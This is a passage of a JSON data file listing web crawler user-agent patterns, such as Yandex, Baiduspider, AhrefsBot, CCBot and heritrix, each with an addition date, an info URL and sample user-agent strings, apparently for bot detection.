    "pattern": "YandexTracker",
    "url": "https://yandex.ru/support/webmaster/robot-workings/check-yandex-robots.html#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (compatible; YandexTracker/1.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2020/11/30"
  }
  ,
  {
    "pattern": "YandexVertis",
    "url": "https://yandex.ru/support/webmaster/robot-workings/check-yandex-robots.html#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (compatible; YandexVertis/3.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2020/11/30"
  }
  ,
  {
    "pattern": "YandexVerticals",
    "url": "https://yandex.ru/support/webmaster/robot-workings/check-yandex-robots.html#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (compatible; YandexVerticals/1.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2020/11/30"
  }
  ,
  {
    "pattern": "YandexWebmaster",
    "url": "https://yandex.ru/support/webmaster/robot-workings/check-yandex-robots.html#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (compatible; YandexWebmaster/2.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2020/11/30"
  }
  ,
  {
    "pattern": "YandexScreenshotBot",
    "url": "https://yandex.ru/support/webmaster/robot-workings/check-yandex-robots.html#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 (compatible; YandexScreenshotBot/3.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2020/11/30"
  }
  ,
  {
    "pattern": "purebot",
    "addition_date": "2010/01/19",
    "instances": []
  }
  ,
  {
    "pattern": "Linguee Bot",
    "addition_date": "2010/01/26",
    "url": "http://www.linguee.com/bot",
    "instances": [
      "Linguee Bot (http://www.linguee.com/bot)",
      "Linguee Bot (http://www.linguee.com/bot; bot@linguee.com)"
    ]
  }
  ,
  {
    "pattern": "CyberPatrol",
    "addition_date": "2010/02/11",
    "url": "http://www.cyberpatrol.com/cyberpatrolcrawler.asp",
    "instances": [
      "CyberPatrol SiteCat Webbot (http://www.cyberpatrol.com/cyberpatrolcrawler.asp)"
    ]
  }
  ,
  {
    "pattern": "voilabot",
    "addition_date": "2010/05/18",
    "instances": [
      "Mozilla/5.0 (Windows NT 5.1; U; Win64; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)",
      "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
    ]
  }
  ,
  {
    "pattern": "Baiduspider",
    "addition_date": "2010/07/15",
    "url": "http://www.baidu.jp/spider/",
    "instances": [
      "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
      "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)"
    ]
  }
  ,
  {
    "pattern": "citeseerxbot",
    "addition_date": "2010/07/17",
    "instances": []
  }
  ,
  {
    "pattern": "spbot",
    "addition_date": "2010/07/31",
    "url": "http://www.seoprofiler.com/bot",
    "instances": [
      "Mozilla/5.0 (compatible; spbot/1.0; +http://www.seoprofiler.com/bot/ )",
      "Mozilla/5.0 (compatible; spbot/1.1; +http://www.seoprofiler.com/bot/ )",
      "Mozilla/5.0 (compatible; spbot/1.2; +http://www.seoprofiler.com/bot/ )",
      "Mozilla/5.0 (compatible; spbot/2.0.1; +http://www.seoprofiler.com/bot/ )",
      "Mozilla/5.0 (compatible; spbot/2.0.2; +http://www.seoprofiler.com/bot/ )",
      "Mozilla/5.0 (compatible; spbot/2.0.3; +http://www.seoprofiler.com/bot/ )",
      "Mozilla/5.0 (compatible; spbot/2.0.4; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/2.0; +http://www.seoprofiler.com/bot/ )",
      "Mozilla/5.0 (compatible; spbot/2.1; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/3.0; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/3.1; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0.1; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0.2; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0.3; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0.4; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0.5; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0.6; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0.7; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0.7; +https://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0.8; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0.9; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0a; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0b; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/4.1.0; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/4.2.0; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/4.3.0; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/4.4.0; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/4.4.1; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/5.0.1; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/5.0.2; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/5.0.3; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/5.0; +http://OpenLinkProfiler.org/bot )"
    ]
  }
  ,
  {
    "pattern": "twengabot",
    "addition_date": "2010/08/03",
    "url": "http://www.twenga.com/bot.html",
    "instances": []
  }
  ,
  {
    "pattern": "postrank",
    "addition_date": "2010/08/03",
    "url": "http://www.postrank.com",
    "instances": [
      "PostRank/2.0 (postrank.com)",
      "PostRank/2.0 (postrank.com; 1 subscribers)"
    ]
  }
  ,
  {
    "pattern": "TurnitinBot",
    "addition_date": "2010/09/26",
    "url": "http://www.turnitin.com",
    "instances": [
      "TurnitinBot (https://turnitin.com/robot/crawlerinfo.html)"
    ]
  }
  ,
  {
    "pattern": "scribdbot",
    "addition_date": "2010/09/28",
    "url": "http://www.scribd.com",
    "instances": []
  }
  ,
  {
    "pattern": "page2rss",
    "addition_date": "2010/10/07",
    "url": "http://www.page2rss.com",
    "instances": [
      "Mozilla/5.0 (compatible;  Page2RSS/0.7; +http://page2rss.com/)"
    ]
  }
  ,
  {
    "pattern": "sitebot",
    "addition_date": "2010/12/15",
    "url": "http://www.sitebot.org",
    "instances": [
      "Mozilla/5.0 (compatible; Whoiswebsitebot/0.1; +http://www.whoiswebsite.net)"
    ]
  }
  ,
  {
    "pattern": "linkdex",
    "addition_date": "2011/01/06",
    "url": "http://www.linkdex.com",
    "instances": [
      "Mozilla/5.0 (compatible; linkdexbot/2.0; +http://www.linkdex.com/about/bots/)",
      "Mozilla/5.0 (compatible; linkdexbot/2.0; +http://www.linkdex.com/bots/)",
      "Mozilla/5.0 (compatible; linkdexbot/2.1; +http://www.linkdex.com/about/bots/)",
      "Mozilla/5.0 (compatible; linkdexbot/2.1; +http://www.linkdex.com/bots/)",
      "Mozilla/5.0 (compatible; linkdexbot/2.2; +http://www.linkdex.com/bots/)",
      "linkdex.com/v2.0",
      "linkdexbot/Nutch-1.0-dev (http://www.linkdex.com/; crawl at linkdex dot com)"
    ]
  }
  ,
  {
    "pattern": "Adidxbot",
    "url": "http://onlinehelp.microsoft.com/en-us/bing/hh204496.aspx",
    "instances": []
  }
  ,
  {
    "pattern": "ezooms",
    "addition_date": "2011/04/27",
    "url": "http://www.phpbb.com/community/viewtopic.php?f=64&t=935605&start=450#p12948289",
    "instances": [
      "Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)"
    ]
  }
  ,
  {
    "pattern": "dotbot",
    "addition_date": "2011/04/27",
    "instances": [
      "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)",
      "dotbot"
    ]
  }
  ,
  {
    "pattern": "Mail.RU_Bot",
    "addition_date": "2011/04/27",
    "instances": [
      "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)",
      "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/",
      "Mozilla/5.0 (compatible; Mail.RU_Bot/2.0; +http://go.mail.ru/",
      "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/Robots/2.0; +http://go.mail.ru/help/robots)"
    ]
  }
  ,
  {
    "pattern": "discobot",
    "addition_date": "2011/05/03",
    "url": "http://discoveryengine.com/discobot.html",
    "instances": [
      "Mozilla/5.0 (compatible; discobot/1.0; +http://discoveryengine.com/discobot.html)",
      "Mozilla/5.0 (compatible; discobot/2.0; +http://discoveryengine.com/discobot.html)",
      "mozilla/5.0 (compatible; discobot/1.1; +http://discoveryengine.com/discobot.html)"
    ]
  }
  ,
  {
    "pattern": "heritrix",
    "addition_date": "2011/06/21",
    "url": "https://github.com/internetarchive/heritrix3/wiki",
    "instances": [
      "Mozilla/5.0 (compatible; heritrix/1.12.1 +http://www.webarchiv.cz)",
      "Mozilla/5.0 (compatible; heritrix/1.12.1b +http://netarkivet.dk/website/info.html)",
      "Mozilla/5.0 (compatible; heritrix/1.14.2 +http://rjpower.org)",
      "Mozilla/5.0 (compatible; heritrix/1.14.2 +http://www.webarchiv.cz)",
      "Mozilla/5.0 (compatible; heritrix/1.14.3 +http://archive.org)",
      "Mozilla/5.0 (compatible; heritrix/1.14.3 +http://www.accelobot.com)",
      "Mozilla/5.0 (compatible; heritrix/1.14.3 +http://www.webarchiv.cz)",
      "Mozilla/5.0 (compatible; heritrix/1.14.3.r6601 +http://www.buddybuzz.net/yptrino)",
      "Mozilla/5.0 (compatible; heritrix/1.14.4 +http://parsijoo.ir)",
      "Mozilla/5.0 (compatible; heritrix/1.14.4 +http://www.exif-search.com)",
      "Mozilla/5.0 (compatible; heritrix/2.0.2 +http://aihit.com)",
      "Mozilla/5.0 (compatible; heritrix/2.0.2 +http://seekda.com)",
      "Mozilla/5.0 (compatible; heritrix/3.0.0-SNAPSHOT-20091120.021634 +http://crawler.archive.org)",
      "Mozilla/5.0 (compatible; heritrix/3.1.0-RC1 +http://boston.lti.cs.cmu.edu/crawler_12/)",
      "Mozilla/5.0 (compatible; heritrix/3.1.1 +http://places.tomtom.com/crawlerinfo)",
      "Mozilla/5.0 (compatible; heritrix/3.1.1 +http://www.mixdata.com)",
      "Mozilla/5.0 (compatible; heritrix/3.1.1; UniLeipzigASV +http://corpora.informatik.uni-leipzig.de/crawler_faq.html)",
      "Mozilla/5.0 (compatible; heritrix/3.2.0 +http://www.crim.ca)",
      "Mozilla/5.0 (compatible; heritrix/3.2.0 +http://www.exif-search.com)",
      "Mozilla/5.0 (compatible; heritrix/3.2.0 +http://www.mixdata.com)",
      "Mozilla/5.0 (compatible; heritrix/3.3.0-SNAPSHOT-20160309-0050; UniLeipzigASV +http://corpora.informatik.uni-leipzig.de/crawler_faq.html)",
      "Mozilla/5.0 (compatible; sukibot_heritrix/3.1.1 +http://suki.ling.helsinki.fi/eng/webmasters.html)"
    ]
  }
  ,
  {
    "pattern": "findthatfile",
    "addition_date": "2011/06/21",
    "url": "http://www.findthatfile.com/",
    "instances": []
  }
  ,
  {
    "pattern": "europarchive.org",
    "addition_date": "2011/06/21",
    "url": "",
    "instances": [
      "Mozilla/5.0 (compatible; MSIE 7.0 +http://www.europarchive.org)"
    ]
  }
  ,
  {
    "pattern": "NerdByNature.Bot",
    "addition_date": "2011/07/12",
    "url": "http://www.nerdbynature.net/bot",
    "instances": [
      "Mozilla/5.0 (compatible; NerdByNature.Bot; http://www.nerdbynature.net/bot)"
    ]
  }
  ,
  {
    "pattern": "sistrix crawler",
    "addition_date": "2011/08/02",
    "instances": []
  }
  ,
  {
    "pattern": "Ahrefs(Bot|SiteAudit)",
    "addition_date": "2011/08/28",
    "instances": [
      "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)",
      "Mozilla/5.0 (compatible; AhrefsSiteAudit/6.1; +http://ahrefs.com/robot/)",
      "Mozilla/5.0 (compatible; AhrefsBot/5.2; News; +http://ahrefs.com/robot/)",
      "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)",
      "Mozilla/5.0 (compatible; AhrefsSiteAudit/5.2; +http://ahrefs.com/robot/)",
      "Mozilla/5.0 (compatible; AhrefsBot/6.1; News; +http://ahrefs.com/robot/)",
      "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
    ]
  }
  ,
  {
    "pattern": "fuelbot",
    "addition_date": "2018/06/28",
    "instances": [
      "fuelbot"
    ]
  }
  ,
  {
    "pattern": "CrunchBot",
    "addition_date": "2018/06/28",
    "instances": [
      "CrunchBot/1.0 (+http://www.leadcrunch.com/crunchbot)"
    ]
  }
  ,
  {
    "pattern": "IndeedBot",
    "addition_date": "2018/06/28",
    "instances": [
      "Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0 (IndeedBot 1.1)"
    ]
  }
  ,
  {
    "pattern": "mappydata",
    "addition_date": "2018/06/28",
    "instances": [
      "Mozilla/5.0 (compatible; Mappy/1.0; +http://mappydata.net/bot/)"
    ]
  }
  ,
  {
    "pattern": "woobot",
    "addition_date": "2018/06/28",
    "instances": [
      "woobot"
    ]
  }
  ,
  {
    "pattern": "ZoominfoBot",
    "addition_date": "2018/06/28",
    "instances": [
      "ZoominfoBot (zoominfobot at zoominfo dot com)"
    ]
  }
  ,
  {
    "pattern": "PrivacyAwareBot",
    "addition_date": "2018/06/28",
    "instances": [
      "Mozilla/5.0 (compatible; PrivacyAwareBot/1.1; +http://www.privacyaware.org)"
    ]
  }
  ,
  {
    "pattern": "Multiviewbot",
    "addition_date": "2018/06/28",
    "instances": [
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Multiviewbot"
    ]
  }
  ,
  {
    "pattern": "SWIMGBot",
    "addition_date": "2018/06/28",
    "instances": [
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36 SWIMGBot"
    ]
  }
  ,
  {
    "pattern": "Grobbot",
    "addition_date": "2018/06/28",
    "instances": [
      "Mozilla/5.0 (compatible; Grobbot/2.2; +https://grob.it)"
    ]
  }
  ,
  {
    "pattern": "eright",
    "addition_date": "2018/06/28",
    "instances": [
      "Mozilla/5.0 (compatible; eright/1.0; +bot@eright.com)"
    ]
  }
  ,
  {
    "pattern": "Apercite",
    "addition_date": "2018/06/28",
    "instances": [
      "Mozilla/5.0 (compatible; Apercite; +http://www.apercite.fr/robot/index.html)"
    ]
  }
  ,
  {
    "pattern": "semanticbot",
    "addition_date": "2018/06/28",
    "instances": [
      "semanticbot",
      "semanticbot (info@semanticaudience.com)"
    ]
  }
  ,
  {
    "pattern": "Aboundex",
    "addition_date": "2011/09/28",
    "url": "http://www.aboundex.com/crawler/",
    "instances": [
      "Aboundex/0.2 (http://www.aboundex.com/crawler/)",
      "Aboundex/0.3 (http://www.aboundex.com/crawler/)"
    ]
  }
  ,
  {
    "pattern": "domaincrawler",
    "addition_date": "2011/10/21",
    "instances": [
      "CipaCrawler/3.0 (info@domaincrawler.com; http://www.domaincrawler.com/www.example.com)"
    ]
  }
  ,
  {
    "pattern": "wbsearchbot",
    "addition_date": "2011/12/21",
    "url": "http://www.warebay.com/bot.html",
    "instances": []
  }
  ,
  {
    "pattern": "summify",
    "addition_date": "2012/01/04",
    "url": "http://summify.com",
    "instances": [
      "Summify (Summify/1.0.1; +http://summify.com)"
    ]
  }
  ,
  {
    "pattern": "CCBot",
    "addition_date": "2012/02/05",
    "url": "http://www.commoncrawl.org/bot.html",
    "instances": [
      "CCBot/2.0 (http://commoncrawl.org/faq/)",
      "CCBot/2.0 (https://commoncrawl.org/faq/)"
    ]
  }
  ,
  {
    "pattern": "edisterbot",
    "addition_date": "2012/02/25",
    "instances": []
  }
  ,
  {
    "pattern": "seznambot",
    "addition_date": "2012/03/14",
    "instances": [
      "Mozilla/5.0 (compatible; SeznamBot/3.2-test1-1; +http://napoveda.seznam.cz/en/seznambot-intro/)",
      "Mozilla/5.0 (compatible; SeznamBot/3.2-test1; +http://napoveda.seznam.cz/en/seznambot-intro/)",
      "Mozilla/5.0 (compatible; SeznamBot/3.2-test2; +http://napoveda.seznam.cz/en/seznambot-intro/)",
      "Mozilla/5.0 (compatible; SeznamBot/3.2-test4; +http://napoveda.seznam.cz/en/seznambot-intro/)",
      "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
    ]
  }
  ,
  {
    "pattern": "ec2linkfinder",
    "addition_date": "2012/03/22",
    "instances": [
      "ec2linkfinder"
    ]
  }
  ,
  {
    "pattern": "gslfbot",
    "addition_date": "2012/04/03",
    "instances": []
  }
  ,
  {
    "pattern": "aiHitBot",
    "addition_date": "2012/04/16",
    "instances": [
      "Mozilla/5.0 (compatible; aiHitBot/2.9; +https://www.aihitdata.com/about)"
    ]
  }
  ,
  {
    "pattern": "intelium_bot",
    "addition_date": "2012/05/07",
    "instances": []
  }
  ,
  {
    "pattern": "facebookexternalhit",
    "addition_date": "2012/05/07",
    "instances": [
      "facebookexternalhit/1.0 (+http://www.facebook.com/externalhit_uatext.php)",
      "facebookexternalhit/1.1",
      "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
    ],
    "url": "https://developers.facebook.com/docs/sharing/webmasters/crawler/"
  }
  ,
  {
    "pattern": "Yeti",
    "addition_date": "2012/05/07",
    "url": "http://naver.me/bot",
    "instances": [
      "Mozilla/5.0 (compatible; Yeti/1.1; +http://naver.me/bot)"
    ]
  }
  ,
  {
    "pattern": "RetrevoPageAnalyzer",
    "addition_date": "2012/05/07",
    "instances": [
      "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; RetrevoPageAnalyzer; +http://www.retrevo.com/content/about-us)"
    ]
  }
  ,
  {
    "pattern": "lb-spider",
    "addition_date": "2012/05/07",
    "instances": []
  }
  ,
  {
    "pattern": "Sogou",
    "addition_date": "2012/05/13",
    "url": "http://www.sogou.com/docs/help/webmasters.htm#07",
    "instances": [
      "Sogou News Spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)",
      "Sogou Pic Spider/3.0(+http://www.sogou.com/docs/help/webmasters.htm#07)",
      "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
    ]
  }
  ,
  {
    "pattern": "lssbot",
    "addition_date": "2012/05/15",
    "instances": []
  }
  ,
  {
    "pattern": "careerbot",
    "addition_date": "2012/05/23",
    "url": "http://www.career-x.de/bot.html",
    "instances": []
  }
  ,
  {
    "pattern": "wotbox",
    "addition_date": "2012/06/12",
    "url": "http://www.wotbox.com",
    "instances": [
      "Wotbox/2.0 (bot@wotbox.com; http://www.wotbox.com)",
      "Wotbox/2.01 (+http://www.wotbox.com/bot/)"
    ]
  }
  ,
  {
    "pattern": "wocbot",
    "addition_date": "2012/07/25",
    "url": "http://www.wocodi.com/crawler",
    "instances": []
  }
  ,
  {
    "pattern": "ichiro",
    "addition_date": "2012/08/28",
    "url": "http://help.goo.ne.jp/help/article/1142",
    "instances": [
      "DoCoMo/2.0 P900i(c100;TB;W24H11) (compatible; ichiro/mobile goo; +http://help.goo.ne.jp/help/article/1142/)",
      "DoCoMo/2.0 P900i(c100;TB;W24H11) (compatible; ichiro/mobile goo; +http://search.goo.ne.jp/option/use/sub4/sub4-1/)",
      "DoCoMo/2.0 P900i(c100;TB;W24H11) (compatible; ichiro/mobile goo;+http://search.goo.ne.jp/option/use/sub4/sub4-1/)",
      "DoCoMo/2.0 P900i(c100;TB;W24H11)(compatible; ichiro/mobile goo;+http://help.goo.ne.jp/door/crawler.html)",
      "DoCoMo/2.0 P901i(c100;TB;W24H11) (compatible; ichiro/mobile goo; +http://help.goo.ne.jp/door/crawler.html)",
      "KDDI-CA31 UP.Browser/6.2.0.7.3.129 (GUI) MMP/2.0 (compatible; ichiro/mobile goo; +http://help.goo.ne.jp/help/article/1142/)",
      "KDDI-CA31 UP.Browser/6.2.0.7.3.129 (GUI) MMP/2.0 (compatible; ichiro/mobile goo; +http://search.goo.ne.jp/option/use/sub4/sub4-1/)",
      "KDDI-CA31 UP.Browser/6.2.0.7.3.129 (GUI) MMP/2.0 (compatible; ichiro/mobile goo;+http://search.goo.ne.jp/option/use/sub4/sub4-1/)",
      "ichiro/2.0 (http://help.goo.ne.jp/door/crawler.html)",
      "ichiro/2.0 (ichiro@nttr.co.jp)",
      "ichiro/3.0 (http://help.goo.ne.jp/door/crawler.html)",
      "ichiro/3.0 (http://help.goo.ne.jp/help/article/1142)",
      "ichiro/3.0 (http://search.goo.ne.jp/option/use/sub4/sub4-1/)",
      "ichiro/4.0 (http://help.goo.ne.jp/door/crawler.html)",
      "ichiro/5.0 (http://help.goo.ne.jp/door/crawler.html)"
    ]
  }
  ,
  {
    "pattern": "DuckDuckBot",
    "addition_date": "2012/09/19",
    "url": "http://duckduckgo.com/duckduckbot.html",
    "instances": [
      "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
      "DuckDuckBot/1.1; (+http://duckduckgo.com/duckduckbot.html)",
      "Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)",
      "'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)'"
    ]
  }
  ,
  {
    "pattern": "lssrocketcrawler",
    "addition_date": "2012/09/24",
    "instances": []
  }
  ,
  {
    "pattern": "drupact",
    "addition_date": "2012/09/27",
    "url": "http://www.arocom.de/drupact",
    "instances": [
      "drupact/0.7; http://www.arocom.de/drupact"
    ]
  }
  ,
  {
    "pattern": "webcompanycrawler",
    "addition_date": "2012/10/03",
    "instances": []
  }
  ,
  {
    "pattern": "acoonbot",
    "addition_date": "2012/10/07",
    "url": "http://www.acoon.de/robot.asp",
    "instances": []
  }
  ,
  {
    "pattern": "openindexspider",
    "addition_date": "2012/10/26",
    "url": "http://www.openindex.io/en/webmasters/spider.html",
    "instances": []
  }
  ,
  {
    "pattern": "gnam gnam spider",
    "addition_date": "2012/10/31",
    "instances": []
  }
  ,
  {
    "pattern": "web-archive-net.com.bot",
    "instances": []
  }
  ,
  {
    "pattern": "backlinkcrawler",
    "addition_date": "2013/01/04",
    "instances": []
  }
  ,
  {
    "pattern": "coccoc",
    "addition_date": "2013/01/04",
    "url": "http://help.coccoc.vn/",
    "instances": [
      "Mozilla/5.0 (compatible; coccoc/1.0; +http://help.coccoc.com/)",
      "Mozilla/5.0 (compatible; coccoc/1.0; +http://help.coccoc.com/searchengine)",
      "Mozilla/5.0 (compatible; coccocbot-image/1.0; +http://help.coccoc.com/searchengine)",
      "Mozilla/5.0 (compatible; coccocbot-web/1.0; +http://help.coccoc.com/searchengine)",
      "Mozilla/5.0 (compatible; image.coccoc/1.0; +http://help.coccoc.com/)",
      "Mozilla/5.0 (compatible; imagecoccoc/1.0; +http://help.coccoc.com/)",
      "Mozilla/5.0 (compatible; imagecoccoc/1.0; +http://help.coccoc.com/searchengine)",
      "coccoc",
      "coccoc/1.0 ()",
      "coccoc/1.0 (http://help.coccoc.com/)",
      "coccoc/1.0 (http://help.coccoc.vn/)"
    ]
  }
  ,
  {
    "pattern": "integromedb",
    "addition_date": "2013/01/10",
    "url": "http://www.integromedb.org/Crawler",
    "instances": [
      "www.integromedb.org/Crawler"
    ]
  }
  ,
  {
    "pattern": "content crawler spider",
    "addition_date": "2013/01/11",
    "instances": []
  }
  ,
  {
    "pattern": "toplistbot",
    "addition_date": "2013/02/05",
    "instances": []
  }
  ,
  {
    "pattern": "it2media-domain-crawler",
    "addition_date": "2013/03/12",
    "instances": [
      "it2media-domain-crawler/1.0 on crawler-prod.it2media.de",
      "it2media-domain-crawler/2.0"
    ]
  }
  ,
  {
    "pattern": "ip-web-crawler.com",
    "addition_date": "2013/03/22",
    "instances": []
  }
  ,
  {
    "pattern": "siteexplorer.info",
    "addition_date": "2013/05/01",
    "instances": [
      "Mozilla/5.0 (compatible; SiteExplorer/1.0b; +http://siteexplorer.info/)",
      "Mozilla/5.0 (compatible; SiteExplorer/1.1b; +http://siteexplorer.info/Backlink-Checker-Spider/)"
    ]
  }
  ,
  {
    "pattern": "elisabot",
    "addition_date": "2013/06/27",
    "instances": []
  }
  ,
  {
    "pattern": "proximic",
    "addition_date": "2013/09/12",
    "url": "http://www.proximic.com/info/spider.php",
    "instances": [
      "Mozilla/5.0 (compatible; proximic; +http://www.proximic.com)",
      "Mozilla/5.0 (compatible; proximic; +http://www.proximic.com/info/spider.php)"
    ]
  }
  ,
  {
    "pattern": "changedetection",
    "addition_date": "2013/09/13",
    "url": "http://www.changedetection.com/bot.html",
    "instances": [
      "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;  http://www.changedetection.com/bot.html )"
    ]
  }
  ,
  {
    "pattern": "arabot",
    "addition_date": "2013/10/09",
    "instances": []
  }
  ,
  {
    "pattern": "WeSEE:Search",
    "addition_date": "2013/11/18",
    "instances": [
      "WeSEE:Search",
      "WeSEE:Search/0.1 (Alpha, http://www.wesee.com/en/support/bot/)"
    ]
  }
  ,
  {
    "pattern": "niki-bot",
    "addition_date": "2014/01/01",
    "instances": []
  }
  ,
  {
    "pattern": "CrystalSemanticsBot",
    "addition_date": "2014/02/17",
    "url": "http://www.crystalsemantics.com/user-agent/",
    "instances": []
  }
  ,
  {
    "pattern": "rogerbot",
    "addition_date": "2014/02/28",
    "url": "http://moz.com/help/pro/what-is-rogerbot-",
    "instances": [
      "Mozilla/5.0 (compatible; rogerBot/1.0; UrlCrawler; http://www.seomoz.org/dp/rogerbot)",
      "rogerbot/1.0 (http://moz.com/help/pro/what-is-rogerbot-, rogerbot-crawler+partager@moz.com)",
      "rogerbot/1.0 (http://moz.com/help/pro/what-is-rogerbot-, rogerbot-crawler+shiny@moz.com)",
      "rogerbot/1.0 (http://moz.com/help/pro/what-is-rogerbot-, rogerbot-wherecat@moz.com",
      "rogerbot/1.0 (http://moz.com/help/pro/what-is-rogerbot-, rogerbot-wherecat@moz.com)",
      "rogerbot/1.0 (http://www.moz.com/dp/rogerbot, rogerbot-crawler@moz.com)",
      "rogerbot/1.0 (http://www.seomoz.org/dp/rogerbot, rogerbot-crawler+shiny@seomoz.org)",
      "rogerbot/1.0 (http://www.seomoz.org/dp/rogerbot, rogerbot-crawler@seomoz.org)",
      "rogerbot/1.0 (http://www.seomoz.org/dp/rogerbot, rogerbot-wherecat@moz.com)",
      "rogerbot/1.1 (http://moz.com/help/guides/search-overview/crawl-diagnostics#more-help, rogerbot-crawler+pr2-crawler-05@moz.com)",
      "rogerbot/1.1 (http://moz.com/help/guides/search-overview/crawl-diagnostics#more-help, rogerbot-crawler+pr4-crawler-11@moz.com)",
      "rogerbot/1.1 (http://moz.com/help/guides/search-overview/crawl-diagnostics#more-help, rogerbot-crawler+pr4-crawler-15@moz.com)",
      "rogerbot/1.2 (http://moz.com/help/pro/what-is-rogerbot-, rogerbot-crawler+phaser-testing-crawler-01@moz.com)"
    ]
  }
  ,
  {
    "pattern": "360Spider",
    "addition_date": "2014/03/14",
    "url": "http://needs-be.blogspot.co.uk/2013/02/how-to-block-spider360.html",
    "instances": [
      "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider",
      "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; HaosouSpider; http://www.haosou.com/help/help_3_2.html)",
      "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 QIHU 360SE; 360Spider",
      "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; )  Firefox/1.5.0.11; 360Spider",
      "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.0.11)  Firefox/1.5.0.11; 360Spider",
      "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.0.11) Firefox/1.5.0.11 360Spider;",
      "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.0.11) Gecko/20070312 Firefox/1.5.0.11; 360Spider",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0); 360Spider",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0); 360Spider(compatible; HaosouSpider; http://www.haosou.com/help/help_3_2.html)",
